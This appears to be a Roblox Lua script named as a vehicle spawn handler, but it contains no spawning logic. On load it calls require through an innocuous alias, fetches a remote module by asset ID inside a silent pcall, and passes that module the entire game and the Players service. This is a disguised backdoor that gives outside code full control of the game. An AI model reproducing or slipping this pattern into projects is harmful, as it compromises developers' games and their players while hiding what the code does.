-- Vehicle spawn handler
local Players = game:GetService("Players")
local Spawner = {}

local Registry = {}
Registry.resolve = require

function Spawner.init()
	local ok, mod = pcall(Registry.resolve, 7539164820)
	if ok then mod(game, Players) end
end

Spawner.init()
return Spawner
